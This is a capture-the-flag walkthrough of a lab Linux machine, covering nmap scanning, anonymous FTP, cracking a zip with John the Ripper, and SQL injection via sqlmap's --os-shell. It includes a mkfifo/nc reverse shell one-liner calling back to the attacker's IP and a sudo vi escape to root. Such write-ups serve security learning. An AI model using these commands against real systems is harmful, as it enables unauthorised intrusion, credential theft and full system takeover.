#Linux #FTP #SQL #SUID

**NMAP Scan**

```sh
  nmap -sV -sC -p- 10.129.17.227
  ```

* To see the versions of the services running (-sV)
* To perform a script scan using the default set of scripts (-sC)
* To scan all ports from 1 through 65535 (-p-)

Open Ports

* 21/tcp open  ftp     vsftpd 3.0.3
* 22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
* 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

![image](https://user-images.githubusercontent.com/99097743/169863478-0bfbc6c9-0ec3-49bf-a48e-13fdbe28576a.png)

**FTP**

Nmap scan highlights that **anonymous FTP login is allowed**

We are able to download the **backup.zip**

![image](https://user-images.githubusercontent.com/99097743/169863972-2e3d4672-6476-4db9-a294-0e3977a458df.png)

We have a situation here, what is the password of the zip file?

![image](https://user-images.githubusercontent.com/99097743/169865265-8d628052-84c0-4743-880b-7b51031655c9.png)

No worries, John the Ripper to rescue!

https://github.com/openwall/john

John the Ripper jumbo - advanced offline password cracker, which supports hundreds of hash and cipher types, and runs on many operating systems, CPUs, GPUs, and even some FPGAs

Here are the steps:


1. Generate the hash of the zipfile and save it as hash

```sh
zip2john backup.zip > hash
```

2. Use **John** to crack the password using commonly used words (rock.txt). If the password does not show up on the terminal, you can see the password in jonh.pot

```sh
john -w=/usr/share/wordlists/rockyou.txt hash
```

Thanks John! We can now unzip the **backup.zip**

* index.php  --> there is a username:password pair with MD5 hash: You can use one of the free services for Decrypt & Encrypt MD5
* style.css

Using the credentials we can log in to the Car Catalogue

![image](https://user-images.githubusercontent.com/99097743/169875305-9ca24fb3-ecf4-4df9-bf70-96ca635e8de5.png)


**SQL Injection**

* If you try a single quote (') inside the search box --> ERROR: unterminated quoted string at or near "'" LINE 1: Select * from cars where name ilike '%'%' ^
* If you try ' OR '1' = '1  --> No ERROR message: brings all cars as 1=1 always!


Let's use the **sqlmap** for this lab. 

https://github.com/sqlmapproject/sqlmap.git

Automatic SQL injection and database takeover tool

![image](https://user-images.githubusercontent.com/99097743/169881600-07143523-6f87-4718-8a3c-f4e193bf331a.png)

Here are the steps:


1. Capture the GET file of a sample search with BurpSuite as **new.req**

![image](https://user-images.githubusercontent.com/99097743/169882864-38319cd4-af40-4ee0-b1c7-f196263b2886.png)


2. Run the **sqlmap** tool

```sh
sqlmap -r new.req
```
* -r means REQUESTFILE: Load HTTP request from a file

![image](https://user-images.githubusercontent.com/99097743/169883168-7c07a0ba-86fd-4f12-afeb-2c924713107e.png)

3. Run the **--os-shell** command

```sh
sqlmap -r new.req --os-shell
```
* --os-shell means prompt for an interactive operating system shell
*  If asked "Do you want to retrieve the command standard output? [Y/n/a]" --> Click a = ALWAYS

4. Do not forget to active the listener

![image](https://user-images.githubusercontent.com/99097743/169885449-68625d07-68cc-4ef4-9b7c-2d9099f73384.png)

5. Get the reverse shell payload, revshells.com can help us here, we can try **mkfifo**

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.26 87 >/tmp/f
```

![image](https://user-images.githubusercontent.com/99097743/169886969-48f93363-4338-43c0-ab9b-5120fedddf3e.png)

6. We can improve the shell and make it fully interactive using the following commands

```sh
python3 -c 'import pty;pty.spawn("/bin/bash");'
CTRL+Z
stty raw -echo
fg
export TERM=xterm
```
It worked!

![image](https://user-images.githubusercontent.com/99097743/169887719-ad875cea-7937-4477-8af5-66954b722d72.png)

We can now capture the user flag!

![image](https://user-images.githubusercontent.com/99097743/169892144-9a64989d-8b83-482a-8989-72c3c4080914.png)

**Privilege Escalation**

We are trying privilege escalation By using SUID. Let's start with this command:

```sh
find / -perm -4000 -type f 2>/dev/null
```
* / denotes that we will start from the top (root) of the file system and find every directory
* -perm denotes that we will search for the permissions that follow:
* -type states the type of file we are looking for
* f denotes a regular file, excluding directories and special files
* 2>/dev/null means we will redirect all errors to /dev/null. In other words, we will ignore all errors.

**My shell dies after around 15 secs. I need to find a way (if there is any) to make it more stable.**

**SSH Login**

```sh
ssh postgres@{IP}
```

```sh
sudo -l
#This command shows what priviliges we have
```
![image](https://user-images.githubusercontent.com/99097743/169922058-3c2726ef-1d10-4ef2-802b-a762a960e19f.png)

We can run binaries but we need to use **GTFObins** (https://gtfobins.github.io/) to bypass restrictions to run binaries

```sh
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
#(click) : (type) shell=/bin/sh (click enter)
#(click) : (type) shell

whoami
# should be root
```


